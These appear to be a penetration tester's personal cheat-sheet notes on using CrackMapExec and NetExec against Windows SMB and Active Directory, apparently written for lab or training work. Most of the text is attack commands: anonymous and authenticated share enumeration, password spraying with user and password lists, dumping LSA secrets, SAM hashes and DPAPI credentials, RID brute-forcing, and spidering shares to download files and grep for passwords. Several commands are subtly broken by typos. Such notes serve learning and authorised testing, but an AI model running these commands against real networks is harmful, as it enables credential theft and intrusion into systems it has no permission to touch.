Checking for anonymous access
- crackmapexec smb <IP> -u ‘’ -p ‘’ —shares
  
When enumerating shares on a domain, add the DC into /etc/hosts and run this command
- crackmapexec smb <DOMAIN> -u “<user> -p “pass” —shares
    
    - if anonymous, just do any user then blank password
    
![[../assets/Crackmapexec/image 223.png|image 223.png]]
  
crackmapexec smb <IP> -u <user> -p <pass>
- tells you if the smb is pwned
  
when trying multiples targets, just put the text file of the singular IP
- crackmapexec smb <ip.txt> -u <user> -p <pass>
  
to pass a user and pass file, just put the file instead of the user and pass
- crackmapexec smb <IP> -u <user.txt> -p <pass.txt>
- when passing a user and text file, you can put “—no-brute” to not brute force
  
dumping lsa with crackmapexec
- crackmapexec smb <IP> -u <admin_user> -p <pass> --lsa --local-auth
    
    - —local-auth needed if it’s a local user
    
  
Enumerating smb shares on a subnet
- crackmapexec smb 192.168.56.0/24
![[../assets/Crackmapexec/image 1 162.png|image 1 162.png]]
  
Enumerating for anonymous access on a subnet
![[../assets/Crackmapexec/image 2 142.png|image 2 142.png]]
  
Enumerating all the users in the domain unauthenticated
- crackmapexec smb 192.168.56.0/24 -u ‘’ -p ‘’ —users
![[../assets/Crackmapexec/image 3 126.png|image 3 126.png]]
- can maybe even give a password
  
Checking the password policy
- crackmapexec smb 192.168.56.0/24 -u <user> -p <pass> —pass-pol
![[../assets/Crackmapexec/image 4 114.png|image 4 114.png]]
  
Enumerating shares
- crackmapexec smb 192.168.56.0/24 -u <user> -p <pass> —shares
![[../assets/Crackmapexec/image 5 110.png|image 5 110.png]]
- also shows your user’s permissions in those shares
  
Checking logged on users with an admin account
- crackmapexec smb <IP> -u <user> -p <pass> —loggedon-users
![[../assets/Crackmapexec/image 6 98.png|image 6 98.png]]
  
dumping lsa with an admin account
- crackmapexec <IP> -u <user> -p <pass> —lsa
    
    - lsa = Local Security Authority
    
    - does this through a read in registry keys, which can often get around antivirus
    
  
dumping sam with admin
- crackmapexec <IP> -u <user> -p <pass> —sam
![[../assets/Crackmapexec/image 7 94.png|image 7 94.png]]
  
if a company doesn’t have LAPS, then most of the time the admin password will be the same
  
dumping the lsass with credentials
- poetry run crackmapexec smb <IP> -u <user> -p <pass> —dpapi
    
    - not sure what poetry is but try it without “poetry run” first
    
  
  
Enumerating RIDs
- crackmapexec smb -u <user> -p ‘’ —rid-brute
![[../assets/Crackmapexec/image 8 83.png|image 8 83.png]]
netexec can do the same thing as above
  
  
to continue enumerating with a user list after success
- —continue-on-success
  
  
if you can’t get crackmapexec to work then try the same exact command with nxc
  
# NetExec Spider
spidering to download all files locally and parsing through information
```Markdown
nxc smb <Target Ip> -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```
  
digging for specific information
```Markdown
nxc smb <IP> -u <user> -p '<pass>' --spider <share> --content --pattern "passw"
```
  
then to look for a specific string, do `grep -ri "<string>" .`
- example string could be “passw”